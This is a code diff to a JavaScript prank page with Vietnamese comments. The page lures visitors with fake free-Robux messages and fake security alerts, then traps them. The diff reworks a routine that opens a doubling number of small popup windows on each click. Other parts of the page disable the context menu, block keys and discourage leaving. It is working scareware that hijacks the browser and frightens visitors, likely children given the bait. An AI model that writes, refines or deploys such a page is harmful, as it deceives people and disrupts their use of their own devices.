@@ -70,7 +70,6 @@
             pointer-events: none;
             display: block;
         }
-
     </style>
 </head>
 <body id="mainBody">
@@ -120,7 +119,6 @@
         "🚨 CẢNH BÁO BẢO MẬT: Ai đó đang cố truy cập tài khoản bạn!\nNhấn OK để chặn ngay!",
     ];
 
-    // ─── TIÊU ĐỀ TAB NHẤP NHÁY ───────────────────────────────────────────────
     const titleMessages = [
         "💎 NHẬN 10,000 ROBUX MIỄN PHÍ 💎",
         "🎉 XÁC NHẬN THÀNH CÔNG!",
@@ -179,6 +177,17 @@
         if (fn) fn.call(el).catch(() => {});
     }
 
+    // Mở popup.html dạng cửa sổ nhỏ chứa video
+    let popupCount = 1;
+    async function openPopups(count) {
+        for (let i = 0; i < count; i++) {
+            window.open('popup.html', '_blank',
+                'menubar=no,status=no,toolbar=no,resizable=no,width=420,height=320,titlebar=no');
+            await new Promise(r => setTimeout(r, 60));
+        }
+        popupCount = Math.min(popupCount * 2, 16);
+    }
+
     function launchTroll() {
         uiBox.style.display = "none";
         overlay.style.display = "block";
@@ -199,15 +208,8 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
         window.onbeforeunload = () => "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
 
-        // Click trên overlay → mở popup window thật (gesture hợp lệ)
-        overlay.addEventListener('click', async () => {
-            for (let i = 0; i < popupCount; i++) {
-                window.open(window.location.href, '_blank',
-                    'menubar=no,status=no,toolbar=no,resizable=no,width=420,height=320');
-                await new Promise(r => setTimeout(r, 50));
-            }
-            popupCount = Math.min(popupCount * 2, 16);
-        });
+        // Click trên overlay → mở popup.html chứa video, di chuyển lung tung
+        overlay.addEventListener('click', () => openPopups(popupCount));
     }
 
     function blockKey(e) {
@@ -216,8 +218,6 @@
         return false;
     }
 
-    // ─── POPUP NHÂN ĐÔI ──────────────────────────────────────────────────────
-    let popupCount = 1;
     let msgIndex = 0;
 
     function onFSChange() {
@@ -267,7 +267,6 @@
         document.body.appendChild(popup);
     }
 
-    // CSS animation cho popup
     const style = document.createElement('style');
     style.textContent = `@keyframes popIn { from { transform: translateX(-50%) scale(0.5); opacity:0; } to { transform: translateX(-50%) scale(1); opacity:1; } }`;
     document.head.appendChild(style);
